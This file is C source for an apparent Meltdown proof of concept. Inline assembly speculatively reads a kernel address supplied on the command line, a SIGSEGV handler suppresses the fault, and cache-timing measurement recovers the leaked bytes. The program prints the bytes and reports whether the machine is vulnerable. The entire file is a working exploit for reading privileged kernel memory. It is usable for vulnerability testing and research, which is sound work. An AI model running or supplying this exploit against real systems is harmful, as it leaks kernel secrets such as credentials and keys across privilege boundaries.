#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#include <x86intrin.h>

//#define DEBUG 1

/* comment out if getting illegal insctructions error */
#ifndef HAVE_RDTSCP
# define HAVE_RDTSCP 1
#endif

#if !(defined(__x86_64__) || defined(__i386__))
# error "Only x86-64 and i386 are supported at the moment"
#endif


#define TARGET_OFFSET	12
#define TARGET_SIZE	(1 << TARGET_OFFSET)
#define BITS_READ	8
#define VARIANTS_READ	(1 << BITS_READ)

static char target_array[VARIANTS_READ * TARGET_SIZE];

void clflush_target(void)
{
	int i;

	for (i = 0; i < VARIANTS_READ; i++)
		_mm_clflush(&target_array[i * TARGET_SIZE]);
}

extern char stopspeculate[];

static void __attribute__((noinline))
speculate(unsigned long addr)
{
#ifdef __x86_64__
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"jz 1b\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
#else /* ifdef __x86_64__ */
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%eax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%eax\n\t"
		"jz 1b\n\t"
		"movzx (%[target], %%eax, 1), %%ebx\n"


		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
#endif
}

static inline int
get_access_time(volatile char *addr)
{
	int time1, time2, junk;
	volatile int j;

#if HAVE_RDTSCP
	time1 = __rdtscp(&junk);
	j = *addr;
	time2 = __rdtscp(&junk);
#else
	time1 = __rdtsc();
	j = *addr;
	_mm_mfence();
	time2 = __rdtsc();
#endif

	return time2 - time1;
}

static int cache_hit_threshold;
static int hist[VARIANTS_READ];
void check(void)
{
	int i, time, mix_i;
	volatile char *addr;

	for (i = 0; i < VARIANTS_READ; i++) {
		mix_i = ((i * 167) + 13) & 255;

		addr = &target_array[mix_i * TARGET_SIZE];
		time = get_access_time(addr);

		if (time <= cache_hit_threshold)
			hist[mix_i]++;
	}
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;

#ifdef __x86_64__
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
#else
	ucontext->uc_mcontext.gregs[REG_EIP] = (unsigned long)stopspeculate;
#endif
	return;
}

int set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

#define CYCLES 1000
int readbyte(int fd, unsigned long addr)
{
	int i, ret = 0, max = -1, maxi = -1;
	static char buf[256];

	memset(hist, 0, sizeof(hist));

	for (i = 0; i < CYCLES; i++) {
		ret = pread(fd, buf, sizeof(buf), 0);
		if (ret < 0) {
			perror("pread");
			break;
		}

		clflush_target();

		speculate(addr);
		check();
	}

#ifdef DEBUG
	for (i = 0; i < VARIANTS_READ; i++)
		if (hist[i] > 0)
			printf("addr %lx hist[%x] = %d\n", addr, i, hist[i]);
#endif

	for (i = 1; i < VARIANTS_READ; i++) {
		if (!isprint(i))
			continue;
		if (hist[i] && hist[i] > max) {
			max = hist[i];
			maxi = i;
		}
	}

	return maxi;
}

static char *progname;
int usage(void)
{
	printf("%s: [hexaddr] [size]\n", progname);
	return 2;
}

static int mysqrt(long val)
{
	int root = val / 2, prevroot = 0, i = 0;

	while (prevroot != root && i++ < 100) {
		prevroot = root;
		root = (val / root + root) / 2;
	}

	return root;
}

#define ESTIMATE_CYCLES	1000000
static void
set_cache_hit_threshold(void)
{
	long cached, uncached, i;

	if (0) {
		cache_hit_threshold = 80;
		return;
	}

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(target_array);
		uncached += get_access_time(target_array);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;

	cache_hit_threshold = mysqrt(cached * uncached);

	printf("cached = %ld, uncached = %ld, threshold %d\n",
	       cached, uncached, cache_hit_threshold);
}

static int min(int a, int b)
{
	return a < b ? a : b;
}

int main(int argc, char *argv[])
{
	int ret, fd, i, score, is_vulnerable;
	unsigned long addr, size;
	static char expected[] = "%s version %s";

	progname = argv[0];
	if (argc < 3)
		return usage();

	if (sscanf(argv[1], "%lx", &addr) != 1)
		return usage();

	if (sscanf(argv[2], "%lx", &size) != 1)
		return usage();

	memset(target_array, 1, sizeof(target_array));

	ret = set_signal();

	set_cache_hit_threshold();

	fd = open("/proc/version", O_RDONLY);
	if (fd < 0) {
		perror("open");
		return -1;
	}

	for (score = 0, i = 0; i < size; i++) {
		ret = readbyte(fd, addr);
		if (ret == -1)
			ret = 0xff;
		printf("read %lx = %x %c (score=%d/%d)\n",
		       addr, ret, isprint(ret) ? ret : ' ',
		       ret != 0xff ? hist[ret] : 0,
		       CYCLES);

		if (i < sizeof(expected) &&
		    ret == expected[i])
			score++;

		addr++;
	}

	close(fd);

	is_vulnerable = score > min(size, sizeof(expected)) / 2;

	if (is_vulnerable)
		fprintf(stderr, "VULNERABLE\n");
	else
		fprintf(stderr, "NOT VULNERABLE\n");

	exit(is_vulnerable);
}
